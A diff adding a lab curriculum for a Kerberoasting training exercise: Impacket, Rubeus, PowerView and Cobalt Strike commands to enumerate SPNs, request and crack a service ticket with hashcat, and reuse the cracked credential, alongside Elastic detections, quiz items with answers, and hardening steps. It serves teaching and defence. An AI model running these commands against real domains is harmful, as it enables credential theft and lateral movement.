@@ -196,4 +196,353 @@ cost:
   cpu_pct: 0
   detectability: quiet
 
+curriculum:
+  title: "Kerberoasting — SPN-to-shell on TESTLAB"
+  summary: >
+    Walkthrough of T1558.003 against the lab's deliberately-weak service
+    account `svc_kerb` (SPN: `MSSQLSvc/tlms01.testlab.local:1433`).
+    You will enumerate SPNs from a low-privilege user (`TESTLAB\j.doe`),
+    request a TGS encrypted with the service account's password hash,
+    extract the hash, crack `Summer2025!` against rockyou.txt, validate
+    impact, and review the Elastic detections that fire.
+  learning_objectives:
+    - "Explain why a registered SPN on a user account exposes it to Kerberoasting (any-to-any TGS request)."
+    - "Enumerate Kerberoastable accounts with Cobalt Strike BOFs, Rubeus, Impacket, and PowerView."
+    - "Request a TGS, extract the AS-REP / TGS-REP hash, and crack it offline with hashcat mode 13100."
+    - "Identify the Windows event IDs and Elastic rules that distinguish setup-side noise from real exploitation."
+  prerequisites:
+    - "rockyou.txt wordlist on Kali at /usr/share/wordlists/rockyou.txt (apt install wordlists; gunzip rockyou.txt.gz)"
+    - "Low-privilege TESTLAB domain user credentials — assume `TESTLAB\\j.doe:Welcome1!` (provisioned by the bolt-on's role alongside `svc_kerb`)"
+    - "hashcat >= 6.2 on Kali (apt install hashcat)"
+    - "Impacket >= 0.11 (pipx install impacket)"
+    - "Cobalt Strike beacon active on tlws01 (10.99.50.12) as TESTLAB\\j.doe — required for BOF and Rubeus.exe paths"
+    - "TrustedSec's CS-Situational-Awareness-BOF cloned (https://github.com/trustedsec/CS-Situational-Awareness-BOF) and the kerberoast aggressor script from https://github.com/trustedsec/cs-cna-resources / https://github.com/zer1t0/kerberoast.cna loaded into the CS client"
+  estimated_total_minutes: 40
+  steps:
+    - id: "01-discover-spns"
+      title: "Enumerate Service Principal Names on testlab.local"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — Find every account with a registered SPN
+
+        A registered SPN on a *user* (not computer) account is the
+        Kerberoasting precondition. Any authenticated TESTLAB user can
+        query LDAP for them. Three equivalent paths:
+
+        **Option A — Impacket from Kali (preferred, no beacon traffic)**:
+
+        ```bash
+        # From Kali (192.168.1.100), tunneled via bastion
+        GetUserSPNs.py TESTLAB.LOCAL/j.doe:'Welcome1!' -dc-ip 10.99.50.10
+        ```
+
+        Expected output:
+
+        ```
+        ServicePrincipalName                       Name      MemberOf  PasswordLastSet           LastLogon  Delegation
+        -----------------------------------------  --------  --------  ------------------------  ---------  ----------
+        MSSQLSvc/tlms01.testlab.local:1433         svc_kerb            2025-08-12 14:22:11.000000  <never>
+        HTTP/tlms01.testlab.local                  svc_kerb            2025-08-12 14:22:11.000000  <never>
+        ```
+
+        **Option B — Cobalt Strike BOF (from beacon on tlws01)**:
+
+        TrustedSec's CS-Situational-Awareness-BOF ships an `adcs_enum_com`
+        style enumerator; for SPN-specific work use the
+        `get-spns` BOF from the same repo or Outflank's
+        `Ldapsearch-Ldap-Queries`:
+
+        ```
+        # In CS client connected to your beacon on tlws01
+        beacon> inline-execute /opt/CS-Situational-Awareness-BOF/SA/get_spns/get_spns.x64.o
+        ```
+
+        Repo: https://github.com/trustedsec/CS-Situational-Awareness-BOF
+
+        **Option C — PowerView (from beacon on tlws01)**:
+
+        ```powershell
+        beacon> powerpick Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
+        ```
+
+        You should see `svc_kerb` with SPN `MSSQLSvc/tlms01.testlab.local:1433`.
+
+        > **Elastic rule that fires**: none — pure LDAP queries by an
+        > authenticated user are baseline. The blue team's signal starts
+        > in step 2.
+      assessment:
+        question: "Why is a registered SPN on a USER account dangerous, when a registered SPN on a COMPUTER account is benign?"
+        options:
+          - "Computer accounts have weak default passwords; user accounts have strong ones."
+          - "Computer accounts auto-rotate their passwords every 30 days with 240-bit random values; user-account passwords are human-set and typically far shorter / lower entropy."
+          - "Kerberos refuses to issue TGS for computer-account SPNs."
+          - "Computer accounts cannot be requested as service tickets at all."
+        correct_index: 1
+        explanation: >
+          Both can be Kerberoasted — anyone can request a TGS for any
+          SPN. The difference is crackability: computer accounts use a
+          240-bit cryptographically random password rotated every 30 days
+          by default (effectively uncrackable), while user accounts use
+          whatever the admin typed in (often a 10-character word + year).
+          Kerberoasting succeeds because of the password, not the
+          protocol.
+    - id: "02-request-tgs"
+      title: "Request the TGS for svc_kerb"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 2 — Roast it
+
+        Kerberos lets ANY authenticated principal request a service
+        ticket for ANY registered SPN — the KDC defers authorisation to
+        the service. The TGS-REP body is encrypted with the service
+        account's NT hash (RC4) or AES key (AES128/256).
+
+        **Option A — Impacket from Kali**:
+
+        ```bash
+        GetUserSPNs.py TESTLAB.LOCAL/j.doe:'Welcome1!' \
+            -dc-ip 10.99.50.10 \
+            -request -outputfile /tmp/roast.hashes
+        cat /tmp/roast.hashes
+        ```
+
+        Expected hash format (single line):
+
+        ```
+        $krb5tgs$23$*svc_kerb$TESTLAB.LOCAL$MSSQLSvc/tlms01.testlab.local:1433*$5b3...truncated...$f6e...
+        ```
+
+        The `$23$` in the second field = etype 23 = RC4-HMAC = hashcat
+        mode 13100.
+
+        **Option B — Cobalt Strike BOF (from beacon on tlws01)**:
+
+        Outflank's C2-Tool-Collection ships `kerberoast.x64.o`. Or use
+        Rubeus.exe via `execute-assembly`:
+
+        ```
+        beacon> execute-assembly /opt/Rubeus/Rubeus.exe kerberoast /outfile:roast.hashes /nowrap
+        ```
+
+        Or the TrustedSec `kerberoast.cna` aggressor script (right-click
+        beacon → Kerberoast → All SPNs). Repo:
+        https://github.com/zer1t0/kerberoast.cna
+
+        **Option C — PowerView (from beacon)**:
+
+        ```powershell
+        beacon> powerpick Invoke-Kerberoast -OutputFormat Hashcat | Out-File C:\Windows\Temp\roast.txt
+        beacon> download C:\Windows\Temp\roast.txt
+        ```
+
+        > **Elastic rule that fires**: `Kerberoasting, Unusual Process
+        > Behavior` (rule UUID `897dc6b5-b39f-432a-8d75-d3730d50c782`) —
+        > catches a TGS-REQ flow that originates from an unusual host
+        > process (Rubeus.exe, GetUserSPNs.py via WSL). See the
+        > Detections tab on this drawer.
+    - id: "03-crack-offline"
+      title: "Crack the TGS-REP hash with hashcat mode 13100"
+      estimated_minutes: 12
+      markdown: |
+        ## Step 3 — Crack `Summer2025!` offline
+
+        Modern DCs may pin to AES; verify the etype in the hash header:
+        - `$krb5tgs$23$` → mode **13100** (RC4-HMAC)
+        - `$krb5tgs$17$` → mode **19600** (AES128)
+        - `$krb5tgs$18$` → mode **19700** (AES256)
+
+        The bolt-on's role sets `msDS-SupportedEncryptionTypes = 0x1C`
+        which permits RC4 — Impacket negotiates RC4 by default to make
+        cracking practical, so you should land on mode 13100.
+
+        ```bash
+        # From Kali
+        hashcat -m 13100 -a 0 /tmp/roast.hashes \
+            /usr/share/wordlists/rockyou.txt \
+            -r /usr/share/hashcat/rules/best64.rule \
+            -O --status --status-timer=10
+        ```
+
+        Expected output (truncated):
+
+        ```
+        $krb5tgs$23$*svc_kerb$TESTLAB.LOCAL$MSSQLSvc/tlms01.testlab.local:1433*$...$...:Summer2025!
+
+        Session..........: hashcat
+        Status...........: Cracked
+        Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+        Time.Started.....: ...
+        Time.Estimated...: 0 secs
+        ```
+
+        `Summer2025!` lands in <1 second — the password is in rockyou.txt's
+        base wordlist and matches `Season+Year+!` patterns covered by
+        `best64.rule`.
+
+        > **Why this is a vulnerability, not a misconfiguration**: the
+        > cryptography is sound. The attack works because (a) any
+        > authenticated user can request the TGS, and (b) the password
+        > entropy was low enough to brute-force offline. Mitigation is
+        > NOT to remove the SPN — it is to make the password 25+ chars
+        > random AND clear RC4 from `msDS-SupportedEncryptionTypes`
+        > (which is what this bolt-on's patch does).
+
+        > **Elastic rule that fires**: none — cracking is offline,
+        > entirely on the attacker's host. Defenders cannot detect this
+        > step. That is why detection has to fire on step 2.
+      assessment:
+        question: "You captured a TGS-REP that starts with `$krb5tgs$18$*svc_kerb$...`. Which hashcat mode do you use?"
+        options:
+          - "13100 — Kerberos 5 TGS-REP etype 23 (RC4-HMAC)"
+          - "19600 — Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96)"
+          - "19700 — Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96)"
+          - "18200 — Kerberos 5 AS-REP etype 23"
+        correct_index: 2
+        explanation: >
+          The `$18$` is the etype field — 18 = AES256-CTS-HMAC-SHA1-96.
+          That maps to hashcat mode 19700. 13100 is etype 23 (RC4),
+          19600 is etype 17 (AES128), and 18200 is AS-REP roasting —
+          a different attack with a different precondition
+          (DONT_REQ_PREAUTH).
+    - id: "04-validate-impact"
+      title: "Use the cracked credential — log in as svc_kerb"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 4 — Confirm the credential works
+
+        A cracked hash is only useful if you can use it. Authenticate
+        against tlms01 as svc_kerb to verify the password and assess
+        what svc_kerb can actually reach:
+
+        ```bash
+        # From Kali — test SMB auth
+        nxc smb 10.99.50.11 -u svc_kerb -p 'Summer2025!' -d testlab.local
+        # Or: smbclient -L //10.99.50.11/ -U TESTLAB/svc_kerb%'Summer2025!'
+
+        # Test MSSQL auth (svc_kerb is the SQL service account)
+        impacket-mssqlclient TESTLAB/svc_kerb:'Summer2025!'@10.99.50.11
+        ```
+
+        Expected nxc output on success:
+
+        ```
+        SMB  10.99.50.11  445  TLMS01  [*] Windows Server 2022 Build 20348 x64 (name:TLMS01) (domain:testlab.local) (signing:True) (SMBv1:False)
+        SMB  10.99.50.11  445  TLMS01  [+] testlab.local\svc_kerb:Summer2025!
+        ```
+
+        And mssqlclient should drop you into a `SQL>` prompt where you
+        can `EXEC xp_cmdshell 'whoami'` if `xp_cmdshell` is enabled (it
+        often is, by default, on lab SQL services running as the SPN
+        account).
+
+        From the beacon on tlws01 you can `make_token` and laterally
+        reuse the credential without dropping to Kali:
+
+        ```
+        beacon> make_token TESTLAB\svc_kerb Summer2025!
+        beacon> ls \\tlms01.testlab.local\C$
+        ```
+
+        > **Elastic rule that fires**: `Multiple Logon Failure Followed
+        > by Logon Success` may trigger if you typo the password; on
+        > success, `Successful logon from svc_kerb in unusual context`
+        > is the custom rule defenders should run (compare LogonType /
+        > source workstation against svc_kerb's baseline).
+    - id: "05-detection-mapping"
+      title: "How the SOC sees the chain"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 5 — Detection coverage
+
+        The manifest lists three Elastic rules already mapped:
+
+        1. **Kerberoasting, Unusual Process Behavior** (`897dc6b5-...`)
+           — catches the TGS-REQ from an unusual host process
+           (Rubeus.exe, GetUserSPNs.py via WSL, etc.). High confidence.
+        2. **SPN Attribute Modified** (`0b2f3da5-...`) — catches the
+           *install* side (this bolt-on writing the SPN), not the roast
+           itself. Indirect coverage.
+        3. **User Account Creation** (`1aa9181a-...`) — generic 4720,
+           very low signal.
+
+        Raw EVTX events to pivot on:
+
+        | Event | What it tells you |
+        |---|---|
+        | 4768 | TGT issued — every interactive logon, lots of noise |
+        | **4769** | **TGS issued — filter on `EncryptionType=0x17` (RC4) targeting an SPN that normally negotiates 0x12 (AES256) and you have the smoking gun** |
+        | 5136 | DS object modified — fires on SPN registration (install side) |
+        | 4720 | User account created — fires on install |
+
+        The highest-value DSL query in Kibana:
+
+        ```
+        event.code:4769 AND
+        winlog.event_data.TicketEncryptionType:"0x17" AND
+        winlog.event_data.ServiceName:"svc_kerb*" AND
+        NOT winlog.event_data.IpAddress:("10.99.50.10" OR "10.99.50.11")
+        ```
+
+        That fires on TGS-REQs for svc_kerb encrypted as RC4 from a
+        source that isn't a DC or the legitimate SQL host.
+
+        > **Elastic rule that fires (review phase)**: re-running
+        > step 2 should produce the same `Kerberoasting, Unusual
+        > Process Behavior` alert in your Elastic UI within
+        > ~60 seconds.
+      assessment:
+        question: "Defenders want one query to catch exploitation (not setup) of Kerberoasting against svc_kerb. Which EventID + filter is the highest-fidelity signal?"
+        options:
+          - "4720 — user account created"
+          - "5136 — DS object modified, attribute ServicePrincipalName"
+          - "4769 — TGS issued, ServiceName=svc_kerb, EncryptionType=0x17 (RC4)"
+          - "4624 — successful logon, LogonType=3"
+        correct_index: 2
+        explanation: >
+          4769 with EncryptionType=0x17 (RC4) targeting an account that
+          should otherwise negotiate AES is the canonical signal.
+          4720 / 5136 fire on install only. 4624 fires constantly.
+          The RC4 etype filter is critical — modern Windows clients
+          negotiate AES by default, so RC4 against an SPN is anomalous.
+    - id: "06-apply-patch"
+      title: "Apply the patch and re-test"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 6 — Patch and verify the lab is hardened
+
+        Click **Patch** on this card. The bolt-on's patch block:
+
+        - Rotates `svc_kerb`'s password to a 32-character cryptographically
+          random string via `microsoft.ad.user`.
+        - Sets `msDS-SupportedEncryptionTypes = 0x18` (AES128+AES256 only;
+          RC4 cleared).
+        - Persists the new password to AWS Secrets Manager at
+          `bolton/<lab>/svc_kerb-rotated` so the MSSQL service can be
+          re-credentialed.
+
+        Re-run Step 2 — Impacket now negotiates AES256. The TGS-REP
+        header becomes `$krb5tgs$18$*...` (mode 19700). Re-run hashcat:
+
+        ```bash
+        hashcat -m 19700 -a 0 /tmp/roast.hashes /usr/share/wordlists/rockyou.txt
+        ```
+
+        Expected: hashcat exhausts the wordlist with no result. The
+        32-char random password has ~190 bits of entropy — a bruteforce
+        crack would take >10^40 years on commodity GPUs. The lab is
+        practically unkerberoastable.
+
+        > **Defensive hardening beyond the patch**:
+        > - Move SQL services to **Group Managed Service Accounts**
+        >   (gMSA) — passwords auto-rotate every 30 days and are
+        >   240-bit random.
+        > - Audit for user accounts with SPNs quarterly:
+        >   `Get-ADUser -Filter {ServicePrincipalName -like "*"}`
+        > - Set `msDS-SupportedEncryptionTypes = 0x18` domain-wide via
+        >   GPO `Network security: Configure encryption types allowed
+        >   for Kerberos`.
+
+        > **Rollback**: the manifest declares `patch_revert` — click
+        > Revert on the same row to re-arm.
+
 status: stable
